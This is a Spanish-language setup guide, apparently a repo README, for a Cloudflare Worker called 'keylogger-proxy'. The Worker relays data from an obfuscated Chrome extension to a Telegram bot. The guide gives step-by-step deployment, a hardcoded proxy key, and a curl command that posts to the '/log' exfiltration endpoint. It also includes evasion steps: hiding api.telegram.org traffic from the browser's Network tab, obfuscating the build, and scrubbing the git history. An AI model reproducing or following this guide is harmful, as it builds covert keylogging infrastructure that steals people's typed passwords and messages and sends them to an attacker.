# Deploy Cloudflare Worker (proxy seguro)

## 1. Revoca el token quemado
1. Abre @BotFather en Telegram > `/revoke` > elige tu bot
2. Guarda el NUEVO token, el viejo (`867087...`) ya está en tu git + dist y hay que darlo por perdido.

## 2. Crea el Worker
1. Entra a `dash.cloudflare.com` (cuenta gratis, solo email)
2. Workers & Pages > Create Worker > Deploy > Edit code
3. Borra todo y pega el contenido completo de `worker.js` de este repo
4. Deploy > Save

## 3. Pon los secretos (nunca van en codigo)
En tu Worker > Settings > Variables > Add variable (type Secret):
- `BOT_TOKEN` = tu token NUEVO de BotFather
- `CHAT_ID` = tu chat id
- `PROXY_KEY` = la misma que está en tu `background.js` (`c856462856e500dff07d298a1a2a973f4b3342774c28bae8b2643d825d7ed089`)

Redeploy despues de guardar.

Copia tu URL: `https://keylogger-proxy.TU-SUBDOMINIO.workers.dev/log`

## 4. Conecta la extension
En `background.js` cambia:
```js
const PROXY_URL = 'https://keylogger-proxy.TU-SUBDOMINIO.workers.dev/log';
const PROXY_KEY = 'c856462856e500dff07d298a1a2a973f4b3342774c28bae8b2643d825d7ed089';
```
Debe coincidir con el Secret del Worker.

## 5. Prueba
```bash
curl -X POST https://keylogger-proxy.TU-SUBDOMINIO.workers.dev/log -H "Content-Type: application/json" -H "x-key: c856462856e500dff07d298a1a2a973f4b3342774c28bae8b2643d825d7ed089" -d "{\"text\":\"test proxy <b>OK</b>\"}"
```
Te debe llegar a Telegram y responder `OK`. Si responde `Forbidden` es la key. Si responde `Telegram error` es token/chat.

## 6. Rebuild extension
```bash
node obfuscate.js
```
Carga `dist/` en `chrome://extensions`. En Network ya NO debe aparecer `api.telegram.org`, solo tu `*.workers.dev`.

## 7. Limpieza git
El token viejo sigue en `first commit`. Opciones:
- Repo nuevo (recomendado si ya subiste dist.zip a Releases)
- O `git filter-repo` + force push + rotar token (ya hecho en paso 1)

No publiques `dist.zip` con secretos. Ahora `dist/` ya no lleva token, pero igual no lo subas a git publico.
